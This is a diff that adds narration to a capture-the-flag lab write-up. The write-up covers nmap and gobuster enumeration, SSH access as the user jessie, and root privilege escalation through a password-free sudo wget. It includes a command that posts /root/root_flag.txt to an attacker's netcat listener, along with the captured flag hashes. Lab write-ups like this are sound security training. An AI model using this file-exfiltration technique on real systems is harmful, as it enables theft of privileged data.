@@ -1,7 +1,6 @@
 **Tristan Gomez**
 
-
-nmap
+To begin the challenge, I ran a classic nmap scan, just passing the `-sV` flag to get the software versions of any services that I find.
 ```
 ─$ sudo nmap -sV 10.10.210.190                                                                                   
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 11:57 PDT
@@ -17,9 +16,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
 
 ```
-` <!-- Jessie don't forget to udate the webiste -->`
 
-gobuster
+Looks like we have a website running on port 80 and ssh on port 22. I can't seem to connect to the site from my browser but a `wget http://10.10.216.29` works. Looking at the index.html file, I found `<!-- Jessie don't forget to udate the webiste -->` hidden as a comment. So, we have a potential ssh user now. Let's try to enumerate web pages using gobuster.
 ```
 └─$ gobuster dir -w common.txt -x php,html,txt,js -u 10.10.216.29
 ===============================================================
@@ -58,6 +56,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /sitemap              (Status: 301) [Size: 314] [--> http://10.10.216.29/sitemap
 
 ```
+Hmm, so almost all found pages return 403 forbidden responses, but we do get a 301 redirect on /sitemap which appears to also be a directory. I will enumerate pages in that directory using gobuster again.
+
 
 ```
 └─$ gobuster dir -w common.txt -x php,html,txt,js -u 10.10.216.29/sitemap
@@ -115,6 +115,7 @@ user_flag.txt
 jessie@CorpOne:~/Documents$ cat user_flag.txt
 057c67131c3d5e42dd5cd3075b198ff6
 ```
+Now that we have the user flag, we need to privesc to get the root flag. Let's check the permissions for this user. 
 
 ```
 jessie@CorpOne:~/Documents$ sudo -l
@@ -131,6 +132,7 @@ uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),
 ```
 
 
+So we can run `wget` as the root user without a password. That's highly suspicious. Let's check gtfobins to see if we can abuse this binary. Looks like we can by running the command below. Since I can run wget as root, I can use this to exfiltrate privileged files. I opened up a nc listener first to catch the root.txt file.
 ```
 sudo wget --post-file=/root/root_flag.txt http://10.8.248.108:1111
 --2021-12-12 22:49:22--  http://10.8.248.108:1111/
@@ -140,6 +142,8 @@ Retrying.
 
 ```
 
+
+On the listening end of the connection...
 ```
 └─$ sudo nc -nvlp 1111
 [sudo] password for gomez22: 
@@ -157,3 +161,4 @@ Content-Length: 33
 b1b968b37519ad1daa6408188649263d
 
 ```
+Woo! root flag. Another challenge done.
